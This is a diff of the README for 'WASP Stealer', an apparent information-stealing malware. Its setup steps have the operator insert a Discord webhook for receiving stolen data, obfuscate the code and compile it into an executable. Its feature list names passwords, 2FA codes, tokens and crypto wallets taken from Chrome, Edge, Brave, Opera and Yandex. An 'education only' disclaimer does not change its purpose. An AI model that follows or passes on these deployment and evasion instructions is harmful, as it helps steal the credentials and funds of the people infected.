@@ -7,31 +7,26 @@
 ## WASP Stealer's **Moon** Version
 
  
-# Do not remove the image or it will throws a error.
+# Do not remove the image or it will throw a error.
  
 <p align="center"> 
   <kbd>
 <img src="https://media.discordapp.net/attachments/1062433241723846746/1064631569026920568/Moon.png?width=774&height=580" width="328"></img>
   </kbd>
 </p>
-  
-## 〢 Content
 
-- [📁 Setup]
-- [⚔️ Features]
-- [ ⚠ Note]
-
-### 〢 Setup
+### | Setup
 
 1. Put ur webhook at ``hook = "X"``
 2. Run main.py, you will see your info in the webhook you entered.
-3. Obfuscation: https://pyobfuscate.com/
+3. Obfuscate your code here: https://pyobfuscate.com/
+4. Compile it into a exe with pyinstaller https://pyinstaller.org/
 
 <a id="features"></a>
 
 ---
 
-### 〢 Features
+### | Features
 
 #### Stealer
 
@@ -58,7 +53,7 @@
 - Search User PC for Passwords, 2fa codes, tokens, wallets...
 - Browsers: Opera, Chrome, Brave, Yandex, Edge
 
-### 〢 Note
+### | Note
 
 I am not responsible for any damages this software may cause. This was made for personal education.
 
